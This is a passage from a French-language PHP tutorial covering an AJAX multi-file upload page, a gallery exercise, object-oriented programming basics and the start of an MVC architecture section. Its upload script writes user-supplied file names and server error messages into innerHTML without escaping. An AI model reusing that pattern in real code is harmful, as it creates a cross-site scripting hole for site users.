        let fichiersSelectionnes = [];
        
        fichiersInput.addEventListener('change', function() {
            fichiersSelectionnes = Array.from(this.files);
            afficherFichiers();
        });
        
        function afficherFichiers() {
            fileList.innerHTML = '';
            
            if (fichiersSelectionnes.length === 0) {
                uploadBtn.style.display = 'none';
                return;
            }
            
            fichiersSelectionnes.forEach((fichier, index) =&gt; {
                const item = document.createElement('div');
                item.className = 'file-item';
                item.innerHTML = `
                    &lt;div&gt;
                        &lt;strong&gt;${fichier.name}&lt;/strong&gt;
                        &lt;small&gt;(${(fichier.size / 1024 / 1024).toFixed(2)} MB)&lt;/small&gt;
                    &lt;/div&gt;
                    &lt;button type="button" onclick="supprimerFichier(${index})"&gt;❌&lt;/button&gt;
                `;
                fileList.appendChild(item);
            });
            
            uploadBtn.style.display = 'block';
        }
        
        function supprimerFichier(index) {
            fichiersSelectionnes.splice(index, 1);
            afficherFichiers();
        }
        
        uploadBtn.addEventListener('click', async function() {
            if (fichiersSelectionnes.length === 0) return;
            
            progressContainer.style.display = 'block';
            uploadBtn.disabled = true;
            results.innerHTML = '';
            
            let fichiersUploades = 0;
            const totalFichiers = fichiersSelectionnes.length;
            
            for (let i = 0; i &lt; fichiersSelectionnes.length; i++) {
                const fichier = fichiersSelectionnes[i];
                
                const formData = new FormData();
                formData.append('fichier', fichier);
                
                try {
                    const response = await fetch('upload_ajax.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    fichiersUploades++;
                    const pourcentage = Math.round((fichiersUploades / totalFichiers) * 100);
                    
                    progressBar.style.width = pourcentage + '%';
                    progressText.textContent = `${pourcentage}% - ${fichiersUploades}/${totalFichiers} fichiers`;
                    
                    // Afficher le résultat
                    const resultDiv = document.createElement('div');
                    resultDiv.style.cssText = 'margin: 10px 0; padding: 10px; border-radius: 5px;';
                    
                    if (result.succes) {
                        resultDiv.style.background = '#d4edda';
                        resultDiv.innerHTML = `✅ &lt;strong&gt;${fichier.name}&lt;/strong&gt; uploadé avec succès`;
                    } else {
                        resultDiv.style.background = '#f8d7da';
                        resultDiv.innerHTML = `❌ &lt;strong&gt;${fichier.name}&lt;/strong&gt; : ${result.erreurs.join(', ')}`;
                    }
                    
                    results.appendChild(resultDiv);
                    
                } catch (error) {
                    console.error('Erreur upload:', error);
                }
            }
            
            uploadBtn.disabled = false;
            
            // Réinitialiser après quelques secondes
            setTimeout(() =&gt; {
                progressContainer.style.display = 'none';
                progressBar.style.width = '0%';
                fichiersSelectionnes = [];
                fileList.innerHTML = '';
                uploadBtn.style.display = 'none';
                fichiersInput.value = '';
            }, 3000);
        });
        
        // Gestion du drag & drop
        const uploadZone = document.querySelector('.upload-zone');
        
        uploadZone.addEventListener('dragover', (e) =&gt; {
            e.preventDefault();
            uploadZone.style.borderColor = '#007bff';
            uploadZone.style.background = '#f0f8ff';
        });
        
        uploadZone.addEventListener('dragleave', () =&gt; {
            uploadZone.style.borderColor = '#ccc';
            uploadZone.style.background = '#fafafa';
        });
        
        uploadZone.addEventListener('drop', (e) =&gt; {
            e.preventDefault();
            uploadZone.style.borderColor = '#ccc';
            uploadZone.style.background = '#fafafa';
            
            const files = Array.from(e.dataTransfer.files);
            fichiersSelectionnes = files;
            afficherFichiers();
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>Script PHP pour l'upload AJAX :</h4>
    <pre><code>&lt;?php
// upload_ajax.php
header('Content-Type: application/json');

require_once 'TraitementImage.php'; // Inclure notre classe

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['fichier'])) {
        throw new Exception('Aucun fichier reçu');
    }
    
    $upload = new TraitementImage('uploads/', 10 * 1024 * 1024); // 10 MB max
    $resultat = $upload-&gt;uploader($_FILES['fichier']);
    
    if ($resultat['succes']) {
        // Optionnel : sauvegarder en base de données
        $pdo = connecterDB();
        $sql = "INSERT INTO fichiers_uploades (nom_original, nom_fichier, taille, type, date_upload) 
                VALUES (:nom_original, :nom_fichier, :taille, :type, NOW())";
        
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([
            ':nom_original' =&gt; $_FILES['fichier']['name'],
            ':nom_fichier' =&gt; $resultat['nom_fichier'],
            ':taille' =&gt; $resultat['taille'],
            ':type' =&gt; $resultat['type']
        ]);
        
        echo json_encode([
            'succes' =&gt; true,
            'nom_fichier' =&gt; $resultat['nom_fichier'],
            'taille' =&gt; $resultat['taille']
        ]);
    } else {
        echo json_encode([
            'succes' =&gt; false,
            'erreurs' =&gt; $resultat['erreurs']
        ]);
    }
    
} catch (Exception $e) {
    echo json_encode([
        'succes' =&gt; false,
        'erreurs' =&gt; [$e-&gt;getMessage()]
    ]);
}
?&gt;</code></pre>

    <h3>16.6 Exercice pratique : Galerie photos complète</h3>
    
    <p><strong>Objectif :</strong> Créer une galerie photos avec upload sécurisé, miniatures et organisation par albums.</p>
    
    <p><strong>Fonctionnalités à implémenter :</strong></p>
    <ol>
        <li>Upload multiple d'images avec validation</li>
        <li>Création automatique de miniatures</li>
        <li>Organisation par albums</li>
        <li>Affichage en galerie responsive</li>
        <li>Suppression sécurisée</li>
        <li>Recherche par nom/date</li>
    </ol>

    <details>
        <summary><strong>💡 Voir la structure de solution</strong></summary>
        <pre><code>Structure de la galerie :
├── config.php
├── classes/
│   ├── UploadSecurise.php
│   ├── TraitementImage.php
│   └── GestionnaireGalerie.php
├── uploads/
│   ├── originales/
│   └── miniatures/
├── galerie.php (affichage)
├── upload.php (formulaire)
├── traiter_upload.php
├── supprimer.php
└── admin.php (gestion)

Table SQL :
CREATE TABLE photos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom_original VARCHAR(255),
    nom_fichier VARCHAR(255),
    album VARCHAR(100),
    description TEXT,
    taille INT,
    largeur INT,
    hauteur INT,
    date_upload TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

Exemple GestionnaireGalerie.php :
&lt;?php
class GestionnaireGalerie extends TraitementImage {
    private $pdo;
    
    public function __construct($pdo) {
        parent::__construct('uploads/originales/');
        $this-&gt;pdo = $pdo;
    }
    
    public function ajouterPhoto($fichier, $album = 'general', $description = '') {
        $resultat = $this-&gt;uploaderImageAvecMiniature($fichier);
        
        if ($resultat['succes']) {
            // Récupérer les dimensions
            $infoImage = getimagesize($resultat['chemin_complet']);
            
            $sql = "INSERT INTO photos (nom_original, nom_fichier, album, description, 
                    taille, largeur, hauteur) VALUES (?, ?, ?, ?, ?, ?, ?)";
            
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                $fichier['name'],
                $resultat['nom_fichier'],
                $album,
                $description,
                $resultat['taille'],
                $infoImage[0],
                $infoImage[1]
            ]);
            
            $resultat['id'] = $this-&gt;pdo-&gt;lastInsertId();
        }
        
        return $resultat;
    }
    
    public function obtenirPhotos($album = null, $limite = 20, $page = 1) {
        $offset = ($page - 1) * $limite;
        
        if ($album) {
            $sql = "SELECT * FROM photos WHERE album = ? ORDER BY date_upload DESC LIMIT ? OFFSET ?";
            $params = [$album, $limite, $offset];
        } else {
            $sql = "SELECT * FROM photos ORDER BY date_upload DESC LIMIT ? OFFSET ?";
            $params = [$limite, $offset];
        }
        
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute($params);
        
        return $stmt-&gt;fetchAll();
    }
    
    public function obtenirAlbums() {
        $sql = "SELECT album, COUNT(*) as nb_photos FROM photos GROUP BY album ORDER BY album";
        return $this-&gt;pdo-&gt;query($sql)-&gt;fetchAll();
    }
    
    public function supprimerPhoto($id) {
        // Récupérer les infos du fichier
        $sql = "SELECT nom_fichier FROM photos WHERE id = ?";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([$id]);
        $photo = $stmt-&gt;fetch();
        
        if ($photo) {
            // Supprimer les fichiers physiques
            $cheminOriginal = 'uploads/originales/' . $photo['nom_fichier'];
            $cheminMiniature = 'uploads/miniatures/' . pathinfo($photo['nom_fichier'], PATHINFO_FILENAME) . '_thumb.' . pathinfo($photo['nom_fichier'], PATHINFO_EXTENSION);
            
            if (file_exists($cheminOriginal)) unlink($cheminOriginal);
            if (file_exists($cheminMiniature)) unlink($cheminMiniature);
            
            // Supprimer de la base
            $sql = "DELETE FROM photos WHERE id = ?";
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            return $stmt-&gt;execute([$id]);
        }
        
        return false;
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 17: Notions de programmation orientée objet (POO) -->
<section class="part17">
    <h2>17. Notions de programmation orientée objet (POO)</h2>
    
    <p>La <strong>Programmation Orientée Objet</strong> (POO) est comme organiser votre code en <strong>"boîtes intelligentes"</strong> qui savent faire des choses spécifiques. Imaginez une voiture : au lieu d'avoir des milliers de pièces éparpillées, tout est organisé en systèmes (moteur, freins, direction...) qui fonctionnent ensemble !</p>

    <p>Nous avons déjà utilisé quelques classes dans les parties précédentes. Maintenant, apprenons à créer nos propres "boîtes magiques" !</p>

    <h3>17.1 Qu'est-ce qu'une classe et un objet ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>🏗️ Analogie avec l'architecture :</h4>
        <ul>
            <li><strong>Classe</strong> = Le plan de construction d'une maison</li>
            <li><strong>Objet</strong> = Une maison construite à partir de ce plan</li>
            <li><strong>Propriétés</strong> = Les caractéristiques (couleur, nombre de pièces...)</li>
            <li><strong>Méthodes</strong> = Les actions possibles (ouvrir la porte, allumer la lumière...)</li>
        </ul>
    </div>

    <h4>Première classe simple :</h4>
    <pre><code>&lt;?php
class Voiture {
    // Propriétés (caractéristiques)
    public $marque;
    public $modele;
    public $couleur;
    public $vitesse = 0;
    
    // Méthodes (actions)
    public function demarrer() {
        echo "🚗 La $this-&gt;marque $this-&gt;modele démarre !&lt;br&gt;";
    }
    
    public function accelerer($vitesse) {
        $this-&gt;vitesse += $vitesse;
        echo "🏃 Accélération ! Vitesse actuelle : {$this-&gt;vitesse} km/h&lt;br&gt;";
    }
    
    public function freiner() {
        $this-&gt;vitesse = 0;
        echo "🛑 Arrêt complet !&lt;br&gt;";
    }
    
    public function klaxonner() {
        echo "📯 POUET POUET !&lt;br&gt;";
    }
}

// Créer des objets (instances)
$maVoiture = new Voiture();
$maVoiture-&gt;marque = "Renault";
$maVoiture-&gt;modele = "Clio";
$maVoiture-&gt;couleur = "rouge";

$voitureAmi = new Voiture();
$voitureAmi-&gt;marque = "Peugeot";
$voitureAmi-&gt;modele = "208";
$voitureAmi-&gt;couleur = "bleu";

// Utiliser les méthodes
echo "&lt;h3&gt;🚗 Test de ma voiture :&lt;/h3&gt;";
$maVoiture-&gt;demarrer();
$maVoiture-&gt;accelerer(50);
$maVoiture-&gt;accelerer(30);
$maVoiture-&gt;klaxonner();
$maVoiture-&gt;freiner();

echo "&lt;h3&gt;🚙 Test de la voiture de mon ami :&lt;/h3&gt;";
$voitureAmi-&gt;demarrer();
$voitureAmi-&gt;accelerer(70);
$voitureAmi-&gt;freiner();
?&gt;</code></pre>

    <h3>17.2 Le constructeur - Initialiser intelligemment</h3>
    
    <p>Le <strong>constructeur</strong> est une méthode spéciale qui s'exécute automatiquement quand on crée un objet. C'est comme l'installation initiale d'un appareil !</p>

    <h4>Classe avec constructeur :</h4>
    <pre><code>&lt;?php
class Personne {
    private $nom;
    private $prenom;
    private $age;
    private $email;
    
    // Constructeur - s'exécute automatiquement
    public function __construct($nom, $prenom, $age, $email = null) {
        $this-&gt;nom = $nom;
        $this-&gt;prenom = $prenom;
        $this-&gt;age = $age;
        $this-&gt;email = $email;
        
        echo "👤 Nouvelle personne créée : $prenom $nom&lt;br&gt;";
    }
    
    // Méthodes pour accéder aux propriétés privées
    public function obtenirNomComplet() {
        return $this-&gt;prenom . " " . $this-&gt;nom;
    }
    
    public function obtenirAge() {
        return $this-&gt;age;
    }
    
    public function definirEmail($email) {
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this-&gt;email = $email;
            echo "📧 Email mis à jour : $email&lt;br&gt;";
        } else {
            echo "❌ Email invalide !&lt;br&gt;";
        }
    }
    
    public function sePresenter() {
        $presentation = "Bonjour, je suis {$this-&gt;obtenirNomComplet()}, j'ai {$this-&gt;age} ans";
        if ($this-&gt;email) {
            $presentation .= " et mon email est {$this-&gt;email}";
        }
        echo $presentation . ".&lt;br&gt;";
    }
    
    public function avoirAnniversaire() {
        $this-&gt;age++;
        echo "🎂 Joyeux anniversaire ! Nouvel âge : {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Création avec le constructeur
$personne1 = new Personne("Dupont", "Jean", 25, "jean.dupont@email.com");
$personne2 = new Personne("Martin", "Marie", 30); // Sans email

echo "&lt;h4&gt;Présentations :&lt;/h4&gt;";
$personne1-&gt;sePresenter();
$personne2-&gt;sePresenter();

echo "&lt;h4&gt;Actions :&lt;/h4&gt;";
$personne2-&gt;definirEmail("marie.martin@email.com");
$personne1-&gt;avoirAnniversaire();
?&gt;</code></pre>

    <h3>17.3 Visibilité : public, private, protected</h3>
    
    <p>En POO, on peut contrôler qui a accès à quoi. C'est comme les <strong>niveaux de sécurité</strong> dans un bâtiment !</p>

    <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>🔐 Niveaux de visibilité :</h4>
        <ul>
            <li><strong>public</strong> 🌐 : Accessible de partout (hall d'accueil)</li>
            <li><strong>private</strong> 🔒 : Accessible uniquement dans la même classe (bureau privé)</li>
            <li><strong>protected</strong> 🛡️ : Accessible dans la classe et ses enfants (bureau familial)</li>
        </ul>
    </div>

    <h4>Exemple avec différents niveaux :</h4>
    <pre><code>&lt;?php
class CompteBancaire {
    public $titulaire;           // Visible partout
    private $solde;              // Visible uniquement ici
    protected $numeroCompte;     // Visible ici et dans les classes enfants
    
    public function __construct($titulaire, $soldeInitial = 0) {
        $this-&gt;titulaire = $titulaire;
        $this-&gt;solde = $soldeInitial;
        $this-&gt;numeroCompte = $this-&gt;genererNumeroCompte();
        
        echo "🏦 Compte créé pour $titulaire avec {$soldeInitial}€&lt;br&gt;";
    }
    
    // Méthode publique pour consulter le solde
    public function consulterSolde() {
        return $this-&gt;solde;
    }
    
    // Méthode publique pour déposer de l'argent
    public function deposer($montant) {
        if ($montant &gt; 0) {
            $this-&gt;solde += $montant;
            echo "💰 Dépôt de {$montant}€. Nouveau solde : {$this-&gt;solde}€&lt;br&gt;";
            return true;
        } else {
            echo "❌ Montant invalide pour le dépôt&lt;br&gt;";
            return false;
        }
    }
    
    // Méthode publique pour retirer de l'argent
    public function retirer($montant) {
        if ($montant &gt; 0 && $montant &lt;= $this-&gt;solde) {
            $this-&gt;solde -= $montant;
            echo "💳 Retrait de {$montant}€. Nouveau solde : {$this-&gt;solde}€&lt;br&gt;";
            return true;
        } else {
            echo "❌ Retrait impossible (montant invalide ou solde insuffisant)&lt;br&gt;";
            return false;
        }
    }
    
    // Méthode privée - ne peut être appelée que depuis cette classe
    private function genererNumeroCompte() {
        return "FR" . rand(1000000000, 9999999999);
    }
    
    // Méthode protégée - accessible aux classes enfants
    protected function obtenirNumeroCompte() {
        return $this-&gt;numeroCompte;
    }
    
    // Méthode pour transférer vers un autre compte
    public function transferer($montant, $compteDestinataire) {
        if ($this-&gt;retirer($montant)) {
            $compteDestinataire-&gt;deposer($montant);
            echo "🔄 Transfert de {$montant}€ vers {$compteDestinataire-&gt;titulaire}&lt;br&gt;";
            return true;
        }
        return false;
    }
}

// Utilisation
$compte1 = new CompteBancaire("Jean Dupont", 1000);
$compte2 = new CompteBancaire("Marie Martin", 500);

echo "&lt;h4&gt;🏦 Opérations bancaires :&lt;/h4&gt;";

// Ces actions fonctionnent (méthodes publiques)
$compte1-&gt;deposer(200);
$compte1-&gt;retirer(150);
echo "Solde de Jean : " . $compte1-&gt;consulterSolde() . "€&lt;br&gt;";

// Transfert entre comptes
$compte1-&gt;transferer(300, $compte2);

echo "Solde final de Jean : " . $compte1-&gt;consulterSolde() . "€&lt;br&gt;";
echo "Solde final de Marie : " . $compte2-&gt;consulterSolde() . "€&lt;br&gt;";

// Ces actions ne fonctionnent PAS (propriétés/méthodes privées)
// echo $compte1-&gt;solde;                    // Erreur !
// echo $compte1-&gt;genererNumeroCompte();    // Erreur !
?&gt;</code></pre>

    <h3>17.4 Héritage - Créer des familles de classes</h3>
    
    <p>L'<strong>héritage</strong> permet de créer une nouvelle classe basée sur une classe existante. C'est comme l'hérédité familiale : les enfants héritent des caractéristiques des parents, mais peuvent avoir leurs propres spécificités !</p>

    <h4>Classe parent et classes enfants :</h4>
    <pre><code>&lt;?php
// Classe parent (générale)
class Animal {
    protected $nom;
    protected $age;
    protected $espece;
    
    public function __construct($nom, $age, $espece) {
        $this-&gt;nom = $nom;
        $this-&gt;age = $age;
        $this-&gt;espece = $espece;
        echo "🐾 Nouvel animal : $nom ($espece)&lt;br&gt;";
    }
    
    public function manger() {
        echo "🍽️ {$this-&gt;nom} mange&lt;br&gt;";
    }
    
    public function dormir() {
        echo "😴 {$this-&gt;nom} dort&lt;br&gt;";
    }
    
    public function sePresenter() {
        echo "Je suis {$this-&gt;nom}, un(e) {$this-&gt;espece} de {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Classe enfant - hérite d'Animal
class Chien extends Animal {
    private $race;
    
    public function __construct($nom, $age, $race) {
        // Appeler le constructeur parent
        parent::__construct($nom, $age, "chien");
        $this-&gt;race = $race;
    }
    
    // Nouvelle méthode spécifique aux chiens
    public function aboyer() {
        echo "🐕 {$this-&gt;nom} aboie : WOOF WOOF !&lt;br&gt;";
    }
    
    public function jouer() {
        echo "🎾 {$this-&gt;nom} joue avec une balle !&lt;br&gt;";
    }
    
    // Redéfinir (override) une méthode parent
    public function sePresenter() {
        echo "Woof ! Je suis {$this-&gt;nom}, un {$this-&gt;race} de {$this-&gt;age} ans !&lt;br&gt;";
    }
}

class Chat extends Animal {
    private $couleurPelage;
    
    public function __construct($nom, $age, $couleurPelage) {
        parent::__construct($nom, $age, "chat");
        $this-&gt;couleurPelage = $couleurPelage;
    }
    
    public function miauler() {
        echo "🐱 {$this-&gt;nom} miaule : MIAOU !&lt;br&gt;";
    }
    
    public function ronronner() {
        echo "😺 {$this-&gt;nom} ronronne... purrrrr&lt;br&gt;";
    }
    
    public function sePresenter() {
        echo "Miaou ! Je suis {$this-&gt;nom}, un chat {$this-&gt;couleurPelage} de {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Utilisation
echo "&lt;h4&gt;🐾 Création des animaux :&lt;/h4&gt;";
$chien = new Chien("Rex", 3, "Labrador");
$chat = new Chat("Minou", 2, "roux");

echo "&lt;h4&gt;🗣️ Présentations :&lt;/h4&gt;";
$chien-&gt;sePresenter();
$chat-&gt;sePresenter();

echo "&lt;h4&gt;🎭 Actions communes :&lt;/h4&gt;";
$chien-&gt;manger();
$chat-&gt;manger();
$chien-&gt;dormir();
$chat-&gt;dormir();

echo "&lt;h4&gt;🎪 Actions spécifiques :&lt;/h4&gt;";
$chien-&gt;aboyer();
$chien-&gt;jouer();
$chat-&gt;miauler();
$chat-&gt;ronronner();
?&gt;</code></pre>

    <h3>17.5 Méthodes et propriétés statiques</h3>
    
    <p>Les éléments <strong>statiques</strong> appartiennent à la classe elle-même, pas aux objets individuels. C'est comme les <strong>règles communes</strong> à toute une famille !</p>

    <h4>Exemple avec une classe utilitaire :</h4>
    <pre><code>&lt;?php
class Mathematiques {
    // Propriété statique - partagée par toute la classe
    public static $nombreCalculs = 0;
    
    // Constante de classe
    const PI = 3.14159;
    
    // Méthodes statiques - appelables sans créer d'objet
    public static function additionner($a, $b) {
        self::$nombreCalculs++;
        return $a + $b;
    }
    
    public static function multiplier($a, $b) {
        self::$nombreCalculs++;
        return $a * $b;
    }
    
    public static function calculerAireCircle($rayon) {
        self::$nombreCalculs++;
        return self::PI * $rayon * $rayon;
    }
    
    public static function obtenirNombreCalculs() {
        return self::$nombreCalculs;
    }
    
    public static function factorielle($n) {
        self::$nombreCalculs++;
        
        if ($n &lt;= 1) {
            return 1;
        }
        
        return $n * self::factorielle($n - 1);
    }
}

class Convertisseur {
    // Conversions de température
    public static function celsiusVersFahrenheit($celsius) {
        return ($celsius * 9/5) + 32;
    }
    
    public static function fahrenheitVersCelsius($fahrenheit) {
        return ($fahrenheit - 32) * 5/9;
    }
    
    // Conversions de distance
    public static function kmVersMiles($km) {
        return $km * 0.621371;
    }
    
    public static function milesVersKm($miles) {
        return $miles * 1.60934;
    }
}

// Utilisation des méthodes statiques (sans créer d'objets)
echo "&lt;h4&gt;🧮 Calculs mathématiques :&lt;/h4&gt;";
echo "5 + 3 = " . Mathematiques::additionner(5, 3) . "&lt;br&gt;";
echo "7 × 4 = " . Mathematiques::multiplier(7, 4) . "&lt;br&gt;";
echo "Aire d'un cercle de rayon 5 = " . Mathematiques::calculerAireCircle(5) . "&lt;br&gt;";
echo "Factorielle de 5 = " . Mathematiques::factorielle(5) . "&lt;br&gt;";
echo "PI = " . Mathematiques::PI . "&lt;br&gt;";

echo "&lt;p&gt;Nombre total de calculs effectués : " . Mathematiques::obtenirNombreCalculs() . "&lt;/p&gt;";

echo "&lt;h4&gt;🌡️ Conversions :&lt;/h4&gt;";
echo "25°C = " . Convertisseur::celsiusVersFahrenheit(25) . "°F&lt;br&gt;";
echo "100°F = " . Convertisseur::fahrenheitVersCelsius(100) . "°C&lt;br&gt;";
echo "10 km = " . Convertisseur::kmVersMiles(10) . " miles&lt;br&gt;";
echo "5 miles = " . Convertisseur::milesVersKm(5) . " km&lt;br&gt;";
?&gt;</code></pre>

    <h3>17.6 Exemple pratique complet : Système de gestion d'utilisateurs</h3>
    
    <h4>Classe de base et classes spécialisées :</h4>
    <pre><code>&lt;?php
// Classe abstraite - ne peut pas être instanciée directement
abstract class Utilisateur {
    protected $id;
    protected $nom;
    protected $email;
    protected $dateInscription;
    
    public function __construct($nom, $email) {
        $this-&gt;nom = $nom;
        $this-&gt;email = $email;
        $this-&gt;dateInscription = new DateTime();
        $this-&gt;id = uniqid();
    }
    
    // Méthode abstraite - doit être définie dans les classes enfants
    abstract public function obtenirPermissions();
    
    public function obtenirNom() {
        return $this-&gt;nom;
    }
    
    public function obtenirEmail() {
        return $this-&gt;email;
    }
    
    public function obtenirId() {
        return $this-&gt;id;
    }
    
    public function seConnecter() {
        echo "🔐 {$this-&gt;nom} s'est connecté&lt;br&gt;";
    }
    
    public function seDeconnecter() {
        echo "👋 {$this-&gt;nom} s'est déconnecté&lt;br&gt;";
    }
}

class UtilisateurStandard extends Utilisateur {
    private $pointsFidelite = 0;
    
    public function obtenirPermissions() {
        return ['lire', 'commenter'];
    }
    
    public function ajouterPoints($points) {
        $this-&gt;pointsFidelite += $points;
        echo "⭐ {$this-&gt;nom} a gagné $points points ! Total : {$this-&gt;pointsFidelite}&lt;br&gt;";
    }
    
    public function obtenirPoints() {
        return $this-&gt;pointsFidelite;
    }
}

class Moderateur extends Utilisateur {
    private $secteurResponsabilite;
    
    public function __construct($nom, $email, $secteur) {
        parent::__construct($nom, $email);
        $this-&gt;secteurResponsabilite = $secteur;
    }
    
    public function obtenirPermissions() {
        return ['lire', 'commenter', 'moderer', 'bannir'];
    }
    
    public function modererContenu($contenu) {
        echo "🛡️ {$this-&gt;nom} modère le contenu dans le secteur {$this-&gt;secteurResponsabilite}&lt;br&gt;";
    }
    
    public function bannirUtilisateur($utilisateur) {
        echo "🚫 {$this-&gt;nom} a banni {$utilisateur-&gt;obtenirNom()}&lt;br&gt;";
    }
}

class Administrateur extends Utilisateur {
    private static $nombreAdmins = 0;
    
    public function __construct($nom, $email) {
        parent::__construct($nom, $email);
        self::$nombreAdmins++;
    }
    
    public function obtenirPermissions() {
        return ['lire', 'commenter', 'moderer', 'bannir', 'administrer', 'supprimer'];
    }
    
    public function creerUtilisateur($type, $nom, $email, $parametres = []) {
        switch ($type) {
            case 'standard':
                return new UtilisateurStandard($nom, $email);
            case 'moderateur':
                return new Moderateur($nom, $email, $parametres['secteur'] ?? 'general');
            case 'admin':
                return new Administrateur($nom, $email);
            default:
                echo "❌ Type d'utilisateur invalide&lt;br&gt;";
                return null;
        }
    }
    
    public function supprimerUtilisateur($utilisateur) {
        echo "🗑️ {$this-&gt;nom} a supprimé l'utilisateur {$utilisateur-&gt;obtenirNom()}&lt;br&gt;";
    }
    
    public static function obtenirNombreAdmins() {
        return self::$nombreAdmins;
    }
}

// Utilisation du système
echo "&lt;h4&gt;👥 Création des utilisateurs :&lt;/h4&gt;";

$admin = new Administrateur("Alice Admin", "alice@admin.com");
$moderateur = $admin-&gt;creerUtilisateur('moderateur', "Bob Modo", "bob@modo.com", ['secteur' =&gt; 'forum']);
$utilisateur1 = $admin-&gt;creerUtilisateur('standard', "Charlie User", "charlie@user.com");
$utilisateur2 = $admin-&gt;creerUtilisateur('standard', "Diana User", "diana@user.com");

echo "&lt;h4&gt;🔐 Connexions :&lt;/h4&gt;";
$admin-&gt;seConnecter();
$moderateur-&gt;seConnecter();
$utilisateur1-&gt;seConnecter();

echo "&lt;h4&gt;🎯 Actions utilisateurs :&lt;/h4&gt;";
$utilisateur1-&gt;ajouterPoints(100);
$utilisateur1-&gt;ajouterPoints(50);

echo "&lt;h4&gt;🛡️ Actions modération :&lt;/h4&gt;";
$moderateur-&gt;modererContenu("Message suspect");
$moderateur-&gt;bannirUtilisateur($utilisateur2);

echo "&lt;h4&gt;⚙️ Actions administration :&lt;/h4&gt;";
$nouveauModo = $admin-&gt;creerUtilisateur('moderateur', "Eve Modo", "eve@modo.com", ['secteur' =&gt; 'blog']);

echo "&lt;h4&gt;📊 Permissions :&lt;/h4&gt;";
echo "Permissions d'Alice (admin) : " . implode(', ', $admin-&gt;obtenirPermissions()) . "&lt;br&gt;";
echo "Permissions de Bob (modo) : " . implode(', ', $moderateur-&gt;obtenirPermissions()) . "&lt;br&gt;";
echo "Permissions de Charlie (user) : " . implode(', ', $utilisateur1-&gt;obtenirPermissions()) . "&lt;br&gt;";

echo "&lt;p&gt;Nombre total d'administrateurs : " . Administrateur::obtenirNombreAdmins() . "&lt;/p&gt;";
?&gt;</code></pre>
       </section>
       <section>
        <!-- Partie 19: Architecture MVC simplifiée -->
<section class="part19">
    <h2>19. Architecture MVC simplifiée</h2>
    
    <p>Le <strong>MVC</strong> (Model-View-Controller) n'est pas juste un acronyme compliqué, c'est comme <strong>organiser sa maison</strong> ! Imaginez que vous ne rangez jamais : vêtements dans la cuisine, nourriture dans la chambre, livres dans la salle de bain... C'est le chaos ! Le MVC, c'est ranger votre code dans les bonnes "pièces" pour que tout soit clair et facile à maintenir.</p>

    <p><strong>MVC = Organisation + Clarté + Productivité</strong></p>

    <h3>19.1 Comprendre le pattern MVC</h3>
    
    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
        <h4>🏠 Analogie avec un restaurant :</h4>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0;">
            <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; border-left: 4px solid #2196f3;">
                <h5>👨‍🍳 MODEL (Modèle)</h5>
                <p><strong>= La cuisine</strong></p>
                <ul>
                    <li>Prépare les données</li>
                    <li>Gère la base de données</li>
                    <li>Règles métier</li>
                    <li>Calculs et traitements</li>
                </ul>
            </div>
            
            <div style="background: #f3e5f5; padding: 15px; border-radius: 8px; border-left: 4px solid #9c27b0;">
                <h5>🎨 VIEW (Vue)</h5>
                <p><strong>= La salle à manger</strong></p>
                <ul>
                    <li>Présentation finale</li>
                    <li>Interface utilisateur</li>
                    <li>HTML, CSS, JavaScript</li>
                    <li>Affichage des données</li>
                </ul>
            </div>
            
            <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; border-left: 4px solid #4caf50;">
                <h5>🎯 CONTROLLER (Contrôleur)</h5>
                <p><strong>= Le serveur</strong></p>
                <ul>
                    <li>Prend les commandes</li>
                    <li>Coordonne tout</li>
                    <li>Gère les demandes</li>
                    <li>Fait le lien M ↔ V</li>
                </ul>
            </div>
        </div>
    </div>

    <h4>Flux de données dans MVC :</h4>
    <pre style="background: #263238; color: #eceff1; padding: 20px; border-radius: 8px;">
    👤 Utilisateur    →    🎯 Controller    →    👨‍🍳 Model
         ↑                      ↓                    ↓
    🎨 View          ←    📊 Données         ←    🗄️ Database</pre>

    <h3>19.2 Structure d'un projet MVC simple</h3>
    
    <h4>Organisation des dossiers :</h4>
    <pre><code>mon-projet-mvc/
├── index.php              // Point d'entrée
├── config/
│   └── database.php       // Configuration DB
├── controllers/           // 🎯 Contrôleurs
│   ├── HomeController.php
│   ├── ProductController.php
│   └── UserController.php
├── models/               // 👨‍🍳 Modèles
│   ├── Product.php
│   ├── User.php
│   └── Database.php
├── views/                // 🎨 Vues
│   ├── layouts/
│   │   ├── header.php
│   │   └── footer.php
│   ├── home/
│   │   └── index.php
│   ├── products/
│   │   ├── index.php
│   │   ├── show.php
│   │   └── create.php
│   └── users/
│       ├── login.php
│       └── profile.php
├── public/               // Fichiers publics
│   ├── css/
│   ├── js/
│   └── images/
└── core/                 // Classes système
    ├── Router.php
    ├── Controller.php
    └── Model.php</code></pre>

    <h3>19.3 Le Modèle - Gestion des données</h3>
    
    <h4>Classe de base pour tous les modèles :</h4>
    <pre><code>&lt;?php
// core/Model.php
abstract class Model {
    protected $db;
    protected $table;
    
    public function __construct() {
        $this-&gt;db = Database::getInstance()-&gt;getConnection();
    }
    
    // Méthodes de base pour tous les modèles
    public function findAll() {
        $sql = "SELECT * FROM {$this-&gt;table} ORDER BY id DESC";
        $stmt = $this-&gt;db-&gt;prepare($sql);
